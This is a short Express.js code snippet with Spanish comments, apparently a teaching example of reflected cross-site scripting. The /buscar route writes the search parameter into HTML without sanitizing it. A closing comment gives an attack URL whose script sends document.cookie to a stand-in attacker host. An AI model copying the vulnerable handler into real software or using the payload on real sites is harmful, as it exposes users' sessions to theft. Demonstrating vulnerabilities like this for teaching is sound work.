// Refleja la entrada del usuario directamente en el HTML sin sanitizar
app.get('/buscar', (req, res) => {
  const q = req.query.q;
  res.send(`<h1>Resultados para: ${q}</h1>`);
});
// Ataque: /buscar?q=<script>fetch('https://atacante.com?c='+document.cookie)</script>